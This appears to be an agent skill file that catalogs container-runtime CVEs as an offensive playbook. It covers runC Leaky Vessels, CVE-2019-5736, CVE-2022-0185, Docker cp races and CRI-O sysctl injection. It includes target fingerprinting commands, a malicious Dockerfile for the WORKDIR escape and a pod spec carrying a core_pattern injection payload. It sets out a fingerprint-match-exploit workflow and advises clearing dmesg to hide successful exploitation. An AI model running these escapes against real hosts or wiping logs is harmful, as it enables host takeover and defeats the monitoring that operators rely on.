---
name: container-cve
description: "High-impact container-runtime CVE catalog — runC Leaky Vessels (CVE-2024-21626/-23651/-23652/-23653), CVE-2022-0185 (FUSE/legacy-fs), CVE-2019-5736 (runC binary replace), CRI-O Dirty COW analogs, Kubernetes API server CVE-2019-11247 (custom-resource RBAC bypass). Fingerprint → match → exploit."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "container cve runc cve-2024-21626 leaky vessels cve-2019-5736 cve-2022-0185 fuse symlink containerd cri-o k8s api server"
  subdomain: cloud-native
  tags: container-runtime, cve, exploit
  mitre_attack: T1068, T1190, T1611
---

# Container-Runtime CVE Catalog

When you've identified a container target, fingerprint the runtime stack, then check this catalog for a working exploit. Newest first.

## Fingerprint the stack

```bash
# Inside the target container
cat /etc/os-release                  # base image
cat /proc/version                     # host kernel
docker version 2>/dev/null            # if you have client+socket
ctr version 2>/dev/null
runc --version 2>/dev/null
# From kubelet metadata, if accessible:
curl -k https://127.0.0.1:10250/runningpods | jq '.items[0].metadata'
```

## Catalog

### CVE-2024-21626 — runC "Leaky Vessels" WORKDIR escape

**Affects:** runC < 1.1.12, Docker < 25.0.3, containerd < 1.7.13, BuildKit < 0.12.5
**Primitive:** WORKDIR pointing at `/proc/self/fd/N` (where N is an open kernel FD) lets the container CWD escape into the host filesystem.

```bash
# Build a malicious image
cat > Dockerfile <<'EOF'
FROM scratch
WORKDIR /proc/self/fd/8
COPY pwn /pwn
ENTRYPOINT ["/pwn"]
EOF
# Then run on target. Public PoC: github.com/snyk/leaky-vessels-static-detector
```

### CVE-2024-23651/-23652/-23653 — BuildKit cache mount / RUN --mount escapes

**Affects:** BuildKit < 0.12.5
**Primitive:** Crafted Dockerfile uses cache or bind mounts to leak / overwrite host files during `docker build`.

### CVE-2022-0185 — Linux FS context heap overflow

**Affects:** Linux kernel < 5.16.2 (host kernel — affects every container running on it)
**Primitive:** `fsopen()` syscall with a too-long string overflows the heap. CAP_SYS_ADMIN required, but trivial if the container has it.

```bash
# PoC: github.com/Crusaders-of-Rust/CVE-2022-0185
# Container escape via kernel → host root.
```

### CVE-2019-5736 — runC binary overwrite

**Affects:** runC < 1.0.0-rc6, Docker < 18.09.2
**Primitive:** A malicious container can overwrite the runC binary on the host by exploiting how runC re-execs itself when handling `docker exec`.

```bash
# PoC: github.com/feexd/pocs/blob/master/CVE-2019-5736/
# Still alive on old air-gapped + appliance fleets.
```

### CVE-2019-14271 — Docker cp library injection

**Affects:** Docker < 19.03.1
**Primitive:** `docker cp` loaded a libraries from inside the container, letting a malicious image overwrite `libnss_files.so.2` to RCE the docker daemon (= host root).

### CVE-2018-15664 — Docker cp TOCTOU symlink race

**Affects:** Docker < 18.09.3
**Primitive:** Symlink race between `docker cp` resolving the source path and reading it lets you read/write arbitrary host files.

### Kubernetes CVE-2019-11247 — CR vs CRD RBAC bypass

**Affects:** Kubernetes 1.7–1.15
**Primitive:** RBAC checks for CustomResources used the wrong API group, so a user with permission to a CR in one namespace could access CRs in any namespace.

### CRI-O CVE-2022-0811 — kernel sysctl injection

**Affects:** CRI-O 1.19+ through 1.23
**Primitive:** Pod spec `securityContext.sysctls` accepted unescaped kernel parameters → container escape via `kernel.core_pattern`.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwn
spec:
  containers:
  - name: pwn
    image: alpine
    securityContext:
      sysctls:
      - name: "kernel.shm_rmid_forced=1+kernel.core_pattern=|/proc/%P/fd/255 %P"
        value: "0"
```

## Workflow

1. `cve_lookup` the runtime version (e.g., `runC 1.1.5`) and intersect with the catalog above.
2. `cve_poc_lookup` for a working PoC.
3. Try in a copy of the target environment first; container CVE exploits are often kernel-version-fragile.
4. If exploit yields root on host → see `k8s-pod-escape` for the post-escape pivot.

## OPSEC

- All of these generate kernel audit / dmesg entries on success. dmesg ring buffer holds last ~1 MB — clear it (`dmesg -C`) if root.
- The image-based exploits (WORKDIR, BuildKit) require pushing/pulling an attacker image — log line in image-pull events.

## References

- snyk.io/research/leaky-vessels — runC CVE-2024-21626 chain
- Aqua Security "Cloud Native Attack Matrix" — recent CVE coverage
- DEFCON 30 "Kernel Heap Exploitation" — CVE-2022-0185 deep dive
